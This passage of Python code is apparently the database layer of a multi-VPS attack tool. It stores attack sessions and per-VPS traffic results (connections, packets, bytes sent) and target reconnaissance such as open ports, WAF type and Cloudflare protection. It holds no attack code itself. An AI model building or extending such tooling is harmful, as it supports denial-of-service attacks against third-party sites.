                "UPDATE attack_sessions SET notes = ? WHERE id = ?",
                (notes, session_id)
            )
            return True
        except Exception as e:
            logger.error(f"Error updating attack notes: {str(e)}")
            return False
    
    def log_system_event(self, event_type, description, source_ip=None, severity="INFO"):
        """Log system events for auditing"""
        try:
            self.execute_query(
                '''
                INSERT INTO system_logs (event_type, description, source_ip, severity)
                VALUES (?, ?, ?, ?)
                ''',
                (event_type, description, source_ip, severity)
            )
            return True
        except Exception as e:
            logger.error(f"Error logging system event: {str(e)}")
            return False
    
    def record_attack_result(self, session_id, vps_ip, connections, packets, status, bytes_sent=0, cpu=None, memory=None, errors=0, response_codes=None):
        """Record attack results with performance metrics and response codes"""
        try:
            self.execute_query(
                '''
                INSERT INTO attack_results 
                (session_id, vps_ip, connections_active, packets_sent, bytes_sent, status, cpu_usage, memory_usage, error_count, response_codes)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                ''',
                (session_id, vps_ip, connections, packets, bytes_sent, status, cpu, memory, errors, json.dumps(response_codes) if response_codes else None)
            )
            return True
        except Exception as e:
            logger.error(f"Error recording attack result: {str(e)}")
            return False
    
    def get_attack_results(self, session_id):
        """Get all results for a specific attack session"""
        try:
            return self.execute_query(
                'SELECT * FROM attack_results WHERE session_id = ? ORDER BY timestamp',
                (session_id,),
                fetch_all=True
            ) or []
        except Exception as e:
            logger.error(f"Error getting attack results: {str(e)}")
            return []
    
    def save_target_info(self, host, info):
        """Save or update target information"""
        try:
            # Check if target already exists
            existing = self.execute_query(
                "SELECT id FROM target_info WHERE host = ?", 
                (host,), 
                fetch_one=True
            )
            
            if existing:
                # Update existing record
                query = '''
                    UPDATE target_info SET 
                    ip_addresses = ?, open_ports = ?, web_server = ?, 
                    waf_detected = ?, waf_type = ?, cloudflare_protected = ?,
                    ssl_info = ?, dns_records = ?, whois_info = ?,
                    scan_date = ?, notes = ?
                    WHERE host = ?
                '''
                params = (
                    json.dumps(info.get('ip_addresses', [])),
                    json.dumps(info.get('open_ports', [])),
                    info.get('web_server', ''),
                    1 if info.get('waf_detected', False) else 0,
                    info.get('waf_type', ''),
                    1 if info.get('cloudflare_protected', False) else 0,
                    json.dumps(info.get('ssl_info', {})),
                    json.dumps(info.get('dns_records', {})),
                    json.dumps(info.get('whois_info', {})),
                    datetime.now().isoformat(),
                    info.get('notes', ''),
                    host
                )
                self.execute_query(query, params)
                return existing['id']
            else:
                # Insert new record
                query = '''
                    INSERT INTO target_info 
                    (host, ip_addresses, open_ports, web_server, waf_detected, waf_type, 
                    cloudflare_protected, ssl_info, dns_records, whois_info, notes)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                '''
                params = (
                    host,
                    json.dumps(info.get('ip_addresses', [])),
                    json.dumps(info.get('open_ports', [])),
                    info.get('web_server', ''),
                    1 if info.get('waf_detected', False) else 0,
                    info.get('waf_type', ''),
                    1 if info.get('cloudflare_protected', False) else 0,
                    json.dumps(info.get('ssl_info', {})),
                    json.dumps(info.get('dns_records', {})),
                    json.dumps(info.get('whois_info', {})),
                    info.get('notes', '')
                )
                return self.execute_query(query, params)
        except Exception as e:
            logger.error(f"Error saving target info: {str(e)}")
            return None
    
    def get_target_info(self, host):
        """Get target information by hostname"""
        try:
            result = self.execute_query(
                'SELECT * FROM target_info WHERE host = ?',
                (host,),
                fetch_one=True
            )
            
            if result:
                # Convert JSON strings to Python objects
                info = dict(result)
                for key in ['ip_addresses', 'open_ports', 'ssl_info', 'dns_records', 'whois_info']:
                    if info.get(key):
                        try:
                            info[key] = json.loads(info[key])
                        except:
                            info[key] = {}
                
                # Convert integer booleans to Python booleans
                info['waf_detected'] = bool(info.get('waf_detected', 0))
                info['cloudflare_protected'] = bool(info.get('cloudflare_protected', 0))
                
                return info
            return None
        except Exception as e:
            logger.error(f"Error getting target info: {str(e)}")
            return None
    
    def close(self):
        """Close all database connections in the pool"""
        try:
            while not self.connection_pool.empty():
                conn = self.connection_pool.get(block=False)
                if conn:
                    conn.close()
        except Exception as e:
            logger.error(f"Error closing database connections: {str(e)}")
            
    def __del__(self):
        """Destructor to ensure connections are closed"""
        self.close()
